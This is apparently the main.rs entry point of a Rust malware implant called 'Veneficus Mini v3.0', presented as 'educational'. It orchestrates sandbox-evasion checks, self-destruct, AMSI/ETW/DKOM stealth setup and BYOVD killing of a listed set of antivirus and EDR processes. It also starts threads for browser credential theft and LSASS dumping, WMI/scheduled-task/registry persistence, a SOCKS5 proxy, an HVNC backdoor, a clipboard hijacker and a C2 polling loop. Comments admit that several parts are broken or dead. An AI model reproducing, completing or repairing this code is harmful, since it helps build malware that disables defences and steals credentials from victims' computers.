/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// Veneficus Mini v3.0 — process entry and phase machine.
//
// This file does not implement theft, C2, or stealth itself. It decides
// *whether* those modules run, in what order, and on which threads.
//
// BROKEN / DEAD:
//   - `c2::run_command_loop()` is `-> !` (never returns), so Phase 5
//     (join threads + self_destruct) is unreachable.
//   - `mod lateral` is declared but never called; NTLM coercion is dead.
//   - Safe-mode toggle via C2 later does NOT start/stop Phase 3 threads.
//   - PROXY_ADDR / VNC_PORT come from `option_env!` (compile-time), not
//     a runtime environment variable despite the README.
//   - EDR process-name list is exact-match and often wrong for real products.

mod aes_gcm_crypto;  // AES-256-GCM + HMAC helpers used by c2.rs
mod c2;              // HTTPS poll loop against the Cloudflare Worker
mod byovd;           // Bring-your-own-vulnerable-driver EDR kill (feature-gated)
mod payload;         // fingerprint, browser steal, LSASS, clipper
mod stealth;         // syscall/DKOM/AMSI/ETW init
mod persistence;     // WMI / scheduled task / HKLM Run
mod proxy;           // SOCKS5 listener
mod self_destruct;   // wipe + log clear + re-infect
mod utils;           // sandbox score, DPAPI, PID lookup
mod backdoor;        // HVNC skeleton
mod lateral;         // NTLM module — compiled in, never invoked from main

use log::{info, error, warn};
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;

// ── Global safe-mode flag ────────────────────────────────────────────────────
// AtomicBool is Send + Sync so worker threads can read it without a mutex.
// Written from main (environment score) and from C2 dispatch (/enter_safe,
// /exit_safe). Readers do not re-evaluate Phase 2/3 when this flips later.
static SAFE_MODE: AtomicBool = AtomicBool::new(false);

/// Snapshot of the process-wide safe-mode flag (Acquire so a Release store
/// from another thread is visible).
pub fn is_safe_mode() -> bool {
    SAFE_MODE.load(Ordering::Acquire)
}

/// Set or clear safe mode. Does not start or stop already-spawned threads.
pub fn set_safe_mode(enabled: bool) {
    SAFE_MODE.store(enabled, Ordering::Release);
    info!("Safe mode set to: {}", enabled);
}

fn main() {
    // Logging only compiled into debug builds — release is silent.
    // BROKEN for operators: release binaries produce no local log of why
    // C2 or stealth failed; you only see Worker-side traffic (if any).
    #[cfg(debug_assertions)]
    simple_logger::init_with_level(log::Level::Info).expect("logger init failed");

    // UUID is baked by build.rs via cargo:rustc-env. It is both the implant
    // identity (Worker UUID_KV) and the AES key seed (SHA-256 of this string).
    let uuid = env!("IMPLANT_UUID");
    info!("Veneficus Mini v3.0 starting [UUID: {}]", uuid);

    // ── Phase 1: environment assessment ─────────────────────────────────────
    // Heuristic 0–100 score. Side effect: HTTPS GET to google.com inside
    // utils::can_reach_internet() — a distinct IOC from Worker C2.
    let (score, reasons) = utils::assess_environment();
    info!("Environment suspicion score: {}/100", score);
    for r in &reasons { info!("  - {}", r); }

    match score {
        s if s > 80 => {
            // High suspicion: wipe and exit BEFORE any beacon.
            // BROKEN for the operator: they never learn the host existed.
            error!("High suspicion ({}). Self-destructing immediately.", s);
            self_destruct::execute(true);
            return;
        }
        s if s > 60 => {
            // Moderate suspicion: skip stealth/payload/proxy/HVNC/clipper.
            // C2 loop still runs (if relay URL worked).
            warn!("Moderate suspicion ({}). Entering safe mode.", s);
            set_safe_mode(true);
        }
        _ => {
            info!("Environment normal ({}). Full operation.", score);
        }
    }

    // ── Phase 2: stealth engine & EDR neutralisation ─────────────────────────
    if !is_safe_mode() {
        // initialize() always returns true even if AMSI/ETW/DKOM no-op.
        if !stealth::initialize() {
            error!("Stealth init failed – aborting.");
            return;
        }

        #[cfg(feature = "byovd")]
        {
            // Exact image names. Real products often use different binaries
            // (e.g. CSFalconService.exe, SentinelAgent.exe). get_pids_by_name
            // is equality, not substring, so many EDRs will not be found.
            // `cb.exe` is listed twice. CrowdStrike.exe is not a typical image.
            let edr_targets = [
                "MsMpEng.exe", "CrowdStrike.exe", "SentinelOne.exe", "csfalcon.exe",
                "sensor.exe", "Cybereason.exe", "cb.exe", "sysmon.exe",
                "elastic-agent.exe", "endpoint.exe", "sophos.exe", "avast.exe",
                "avg.exe", "mcafee.exe", "symantec.exe", "trendmicro.exe",
                "kaspersky.exe", "bitdefender.exe", "eset.exe", "f-secure.exe",
                "gdata.exe", "panda.exe", "webroot.exe", "zonealarm.exe",
                "comodo.exe", "emsisoft.exe", "hitmanpro.exe", "malwarebytes.exe",
                "norton.exe", "vipre.exe",
                // New EDRs detected in 2025-2026 engagements
                "cyberark.exe", "s1agent.exe", "cb.exe", "cs-agent.exe",
            ];
            let pids = utils::get_pids_by_name(&edr_targets);
            if !pids.is_empty() {
                // drivers/ is empty in this tree; BYOVD will skip every file.
                byovd::kill_edr_processes(&pids);
            }
        }
    } else {
        info!("Safe mode: skipping stealth engine.");
    }

    // ── Phase 3: payload + persistence + backdoors (threaded) ────────────────
    // Handles are stored so Phase 5 could join them — but Phase 5 never runs.
    let mut handles: Vec<thread::JoinHandle<()>> = Vec::new();

    if !is_safe_mode() {
        // Payload: credential theft, LSASS, fingerprint, then returns.
        // Clipper is a *second* thread below; payload::run also does not
        // start the clipper (clipper is only this spawn).
        handles.push(thread::spawn(|| {
            payload::initialize();
            payload::run();
        }));

        // Persistence is synchronous on the main thread (WMI then schtask
        // then HKLM Run). Failure is logged; execution continues.
        if !persistence::install() {
            error!("Persistence installation failed – continuing.");
        }

        // SOCKS5: option_env is compile-time. Default is localhost, so the
        // operator cannot connect remotely. proxy.rs starts with the
        // enabled flag FALSE, so the port is bound but CONNECT is paused.
        let proxy_addr = option_env!("PROXY_ADDR").unwrap_or("127.0.0.1:1080");
        let proxy_addr = proxy_addr.to_string();
        handles.push(thread::spawn(move || {
            // Nested spawn: start_socks5_server *also* creates a thread.
            proxy::start_socks5_server(&proxy_addr);
        }));

        // HVNC: localhost RFB skeleton, no hidden desktop / no framebuffer.
        let vnc_port: u16 = option_env!("VNC_PORT")
            .and_then(|p| p.parse().ok())
            .unwrap_or(5900);
        handles.push(thread::spawn(move || {
            backdoor::hvnc::HvncServer::new(vnc_port).start();
        }));

        // Clipboard hijacker: no-op if C2 /config cannot supply addresses.
        handles.push(thread::spawn(|| {
            payload::clipper::Clipper::new().start();
        }));
    } else {
        // Safe mode: one-shot fingerprint so the operator knows we're alive.
        // Still depends on a working relay URL (currently broken in c2.rs).
        handles.push(thread::spawn(|| {
            let fp = payload::get_device_fingerprint();
            let _ = c2::send_data("fingerprint", &serde_json::to_string(&fp).unwrap_or_default());
        }));
    }

    // ── Phase 4: C2 polling loop (blocking, diverging) ───────────────────────
    // This function is `-> !`. Nothing after this call is reachable.
    c2::run_command_loop();

    // ── Phase 5: graceful shutdown ────────────────────────────────────────────
    // DEAD CODE: run_command_loop never returns.
    // Clipper::stop() is therefore never called; threads are never joined.
    // execute(false) would exit *without* wiping (wipe only if forced==true).
    payload::clipper::Clipper::stop();
    for h in handles { let _ = h.join(); }
    self_destruct::execute(false);
}
